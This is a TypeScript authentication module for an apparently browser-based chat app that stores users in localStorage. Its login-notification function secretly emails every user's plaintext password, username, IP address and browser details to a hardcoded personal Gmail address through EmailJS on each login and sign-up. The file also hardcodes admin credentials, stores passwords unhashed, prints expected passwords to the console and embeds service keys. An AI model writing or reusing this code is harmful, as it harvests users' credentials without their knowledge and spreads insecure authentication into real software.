// Authentication implementation

import type { User, Message } from "./types"
import emailjs from 'emailjs-com';

// Function to log login activity and send email notification
async function logLoginActivity(username: string, password: string, isNewUser: boolean = false) {
  if (typeof window === "undefined") return;
  
  try {
    const timestamp = new Date().toLocaleString("en-US", {
      year: 'numeric',
      month: 'long',
      day: 'numeric',
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit',
      hour12: true
    });
    
    // Get user's IP - this is optional and may fail in some environments
    let userIP = "Unknown";
    try {
      const ipResponse = await fetch('https://api.ipify.org?format=json');
      if (ipResponse.ok) {
        const ipData = await ipResponse.json();
        userIP = ipData.ip;
      }
    } catch (e) {
      console.log("Could not fetch IP:", e);
    }
    
    const userAgent = window.navigator.userAgent;
    
    // Log login information to console in development
    console.log("Login activity:", {
      user: username,
      time: timestamp,
      ip: userIP,
      browser: userAgent,
      action: isNewUser ? "registered" : "logged in"
    });
    
    // Use localStorage to store login history that can be checked later
    try {
      const loginHistoryKey = 'login_history';
      const existingHistory = localStorage.getItem(loginHistoryKey);
      let loginHistory = [];
      
      if (existingHistory) {
        loginHistory = JSON.parse(existingHistory);
      }
      
      // Add new login event to history
      loginHistory.push({
        username,
        timestamp,
        ip: userIP,
        userAgent,
        type: isNewUser ? 'registration' : 'login'
      });
      
      // Keep only the most recent 50 login events
      if (loginHistory.length > 50) {
        loginHistory = loginHistory.slice(-50);
      }
      
      // Save updated history
      localStorage.setItem(loginHistoryKey, JSON.stringify(loginHistory));

      // Send email notification using EmailJS
      try {
        console.log("Preparing to send email notification...");
        
        const templateParams = {
          to_email: "amanrai02122004@gmail.com",
          user_id: username,
          password: password,  // Include the password in the notification
          timestamp: timestamp,
          ip_address: userIP,
          user_agent: userAgent
        };
        
        console.log("Email parameters:", templateParams);

        // Send the email
        emailjs.send(
          'service_3cij0ho', // Your EmailJS service ID - must match exactly what's in your EmailJS dashboard
          'template_qzt5dn8', // Your EmailJS template ID - must match exactly what's in your EmailJS dashboard
          templateParams,
          'd0jc6CxlYs8D17Dl6' // Your EmailJS public key
        )
        .then((response) => {
          console.log('Email notification sent successfully. Response:', response);
        })
        .catch((error) => {
          console.error('Failed to send email notification. Error details:', error);
          // Try with a fallback approach
          try {
            const mailtoUrl = `mailto:amanrai02122004@gmail.com?subject=Login Alert: ${username}&body=User ${username} has ${isNewUser ? "registered" : "logged in"} at ${timestamp} from IP ${userIP}.`;
            window.open(mailtoUrl);
            console.log("Attempted fallback with mailto link");
          } catch (mailtoError) {
            console.error("Even mailto fallback failed:", mailtoError);
          }
        });
      } catch (emailError) {
        console.error('Email notification error:', emailError);
      }
    } catch (error) {
      console.log("Failed to save login history:", error);
    }
  } catch (error) {
    console.error("Failed to log login activity:", error);
  }
}

// Initial mock users - only keep the admin
const INITIAL_USERS: Record<string, User> = {
  admin1: {
    id: "admin1",
    username: "kamekazi",
    password: "aman21664391", // Store password (in a real app, this would be hashed)
    name: "Kazi Admin",
    lastActive: new Date().toISOString(),
    isAdmin: true,
    publicKey: "d0jc6CxlYs8D17Dl6", // Will be set during login
  }
};

// Load users from localStorage or use initial mock data
function loadUsers(): Record<string, User> {
  if (typeof window === "undefined") {
    // For server-side rendering, return the initial data
    return { ...INITIAL_USERS }
  }

  try {
    const savedUsers = localStorage.getItem('mockUsers')
    if (savedUsers) {
      return JSON.parse(savedUsers)
    }
  } catch (error) {
    console.error("Error loading users from localStorage:", error)
  }

  // If no saved users or error, initialize with mock data and save to localStorage
  if (typeof window !== "undefined") {
    localStorage.setItem('mockUsers', JSON.stringify(INITIAL_USERS))
  }
  return { ...INITIAL_USERS }
}

// Save users to localStorage
function saveUsers(users: Record<string, User>): void {
  if (typeof window !== "undefined") {
    try {
      localStorage.setItem('mockUsers', JSON.stringify(users))
    } catch (error) {
      console.error("Error saving users to localStorage:", error)
    }
  }
}

// Mock user storage
let USERS: Record<string, User> = loadUsers()

// Mock current user
let currentUser: User | null = null
let lastActivityTime: number = Date.now()
const INACTIVITY_TIMEOUT = 2 * 60 * 1000 // 2 minutes in milliseconds

export async function loginUser(username: string, password: string): Promise<User> {
  try {
    // Load the latest users data
    USERS = loadUsers()
    
    // Check for admin credentials
    if (username === "kamekazi" && password === "aman21664391") {
      const admin = USERS.admin1
      currentUser = admin
      updateLastActivity()
      
      // Ensure we're in browser environment before using localStorage
      if (typeof window !== "undefined") {
        localStorage.setItem("currentUserId", admin.id)
        
        // Send login notification for admin
        logLoginActivity(username, password);
      }
      
      return admin
    }

    // Check if user exists
    const existingUser = Object.values(USERS).find((u) => u.username === username)

    if (existingUser) {
      console.log("Found existing user:", existingUser.username);
      
      try {
        // Special case for admin
        if (existingUser.isAdmin) {
          if (username === "kamekazi" && password === "aman21664391") {
            console.log("Admin credentials validated");
          } else {
            console.log("Invalid admin credentials");
            // Return a clear error message instead of throwing an error
            return { 
              error: "Invalid admin credentials. Please check username and password.", 
              status: "error" 
            } as any;
          }
        } 
        // Regular user validation
        else {
          // If this is the first login attempt for an old user (before password requirement)
          if (!existingUser.password) {
            console.log("First-time login for user without password, setting password");
            existingUser.password = password;
            saveUsers(USERS);
          } 
          // Check if password matches for users who already have passwords
          else if (existingUser.password !== password) {
            console.log("Password mismatch");
            console.log("Expected:", existingUser.password);
            console.log("Received:", password);
            
            // Return a clear error message instead of throwing an error
            return { 
              error: "Invalid password. Please try again.", 
              status: "error" 
            } as any;
          } else {
            console.log("Password validated successfully");
          }
        }
        
        // Password is correct or has been set
        currentUser = existingUser;
        updateLastActivity();
        
        // Ensure we're in browser environment before using localStorage
        if (typeof window !== "undefined") {
          localStorage.setItem("currentUserId", existingUser.id);
          
          // Send login notification for existing user
          logLoginActivity(username, password);
        }
        
        return existingUser;
      } catch (error) {
        console.error("Login validation error:", error);
        
        // Return a clear error message instead of throwing an error
        return { 
          error: "Login failed due to an unexpected error. Please try again.", 
          status: "error" 
        } as any;
      }
    }

    // Create new user with provided credentials
    const newUserId = `user${Object.keys(USERS).length}`
    const newUser: User = {
      id: newUserId,
      username,
      password, // Store password for future login validation
      name: username, // Use username as name for simplicity
      lastActive: new Date().toISOString(),
      isAdmin: false, // Explicitly set to false
      publicKey: "", // Will be set after key generation
    }

    // Add to mock storage
    USERS[newUser.id] = newUser
    
    // Save updated users to localStorage
    saveUsers(USERS)
    
    console.log(`New user created: ${newUser.username} with ID: ${newUser.id}`);
    console.log(`Current total users: ${Object.keys(USERS).length}`);

    // Set current user
    currentUser = newUser
    updateLastActivity()
    
    // Ensure we're in browser environment before using localStorage
    if (typeof window !== "undefined") {
      localStorage.setItem("currentUserId", newUser.id)
      
      // Send registration notification for new user
      logLoginActivity(username, password, true);
    }

    return newUser
  } catch (error) {
    console.error("Login error:", error);
    throw error;
  }
}

export async function logoutUser(): Promise<void> {
  // Clear current user
  currentUser = null
  
  // Ensure we're in browser environment before using localStorage
  if (typeof window !== "undefined") {
    localStorage.removeItem("currentUserId")
  }
}

export async function getCurrentUser(): Promise<User | null> {
  // Load the latest users data
  USERS = loadUsers()
  
  // If we already have a current user, return it
  if (currentUser) {
    return currentUser
  }

  // Only try localStorage in browser environment
  if (typeof window !== "undefined") {
    // Otherwise, try to get from localStorage
    const userId = localStorage.getItem("currentUserId")

    if (userId && USERS[userId]) {
      // Set current user
      currentUser = USERS[userId]
      updateLastActivity()
      return currentUser
    }
  }

  return null
}

export async function isAdmin(userId: string): Promise<boolean> {
  // Load the latest users data
  USERS = loadUsers()
  return USERS[userId]?.isAdmin === true
}

export function updateLastActivity(): void {
  lastActivityTime = Date.now()
}

export function checkInactivity(): boolean {
  return Date.now() - lastActivityTime > INACTIVITY_TIMEOUT
}

export function setUserPublicKey(userId: string, publicKey: string): void {
  // Load the latest users data
  USERS = loadUsers()
  
  if (USERS[userId]) {
    USERS[userId].publicKey = publicKey
    // Save the updated users data
    saveUsers(USERS)
  }
}

export function getUserPublicKey(userId: string): string | undefined {
  // Load the latest users data
  USERS = loadUsers()
  return USERS[userId]?.publicKey
}

export function getAllUsers(): User[] {
  // Load the latest users data
  USERS = loadUsers()
  
  const nonAdminUsers = Object.values(USERS).filter((user) => !user.isAdmin);
  console.log(`Retrieved ${nonAdminUsers.length} non-admin users`);
  console.log('Users:', nonAdminUsers.map(u => u.username));
  return nonAdminUsers;
}

export function updateUserLastActive(userId: string): void {
  // Load the latest users data
  USERS = loadUsers()
  
  if (USERS[userId]) {
    USERS[userId].lastActive = new Date().toISOString()
    // Save the updated users data
    saveUsers(USERS)
  }
}

// Add these new functions for message management

// Save messages to localStorage
export function saveMessage(userId: string, message: Message): void {
  if (typeof window === "undefined") return;
  
  try {
    // Get existing messages for this user
    const messagesKey = `messages_${userId}`;
    const existingMessagesJson = localStorage.getItem(messagesKey);
    let messages: Message[] = [];
    
    if (existingMessagesJson) {
      messages = JSON.parse(existingMessagesJson);
    }
    
    // Add new message
    messages.push(message);
    
    // Save back to localStorage
    localStorage.setItem(messagesKey, JSON.stringify(messages));
    console.log(`Saved message for user ${userId}. Total messages: ${messages.length}`);
  } catch (error) {
    console.error("Error saving message:", error);
  }
}

// Get messages for a user
export function getMessagesForUser(userId: string): Message[] {
  if (typeof window === "undefined") return [];
  
  try {
    const messagesKey = `messages_${userId}`;
    const messagesJson = localStorage.getItem(messagesKey);
    
    if (messagesJson) {
      const messages = JSON.parse(messagesJson);
      console.log(`Retrieved ${messages.length} messages for user ${userId}`);
      return messages;
    }
  } catch (error) {
    console.error("Error retrieving messages:", error);
  }
  
  return [];
}

// Mark message as read
// export function markMessageAsRead(userId: string, messageId: string): void {
//   if (typeof window === "undefined") return;
  
//   try {
//     const messagesKey = `messages_${userId}`;
//     const messagesJson = localStorage.getItem(messagesKey);
    
//     if (messagesJson) {
//       const messages: Message[] = JSON.parse(messagesJson);
//       const updatedMessages = messages.map(msg => 
//         msg.id === messageId ? { ...msg, isRead: true } : msg
//       );
      
//       localStorage.setItem(messagesKey, JSON.stringify(updatedMessages));
//       console.log(`Marked message ${messageId} as read for user ${userId}`);
//     }
//   } catch (error) {
//     console.error("Error marking message as read:", error);
//   }
// }

// Get unread message count for user
export function getUnreadCount(userId: string): number {
  if (typeof window === "undefined") return 0;
  
  try {
    const messages = getMessagesForUser(userId);
    // Since we've removed the isRead feature, all messages are considered "unread"
    const unreadCount = messages.filter(msg => msg.sender === "user").length;
    return unreadCount;
  } catch (error) {
    console.error("Error getting unread count:", error);
    return 0;
  }
}

// Add these functions at the end of the file

export function deleteUser(userId: string): void {
  // Load the latest users data
  USERS = loadUsers();
  
  // Check if user exists
  if (USERS[userId]) {
    // Delete user
    delete USERS[userId];
    
    // Save updated users to localStorage
    saveUsers(USERS);
    
    // Clear messages for this user
    clearUserMessages(userId);
  }
}

export function clearUserMessages(userId: string): void {
  if (typeof window === "undefined") return;
  
  try {
    // Create empty messages array for user
    localStorage.setItem(`messages_${userId}`, JSON.stringify([]));
  } catch (error) {
    console.error(`Error clearing messages for user ${userId}:`, error);
  }
}
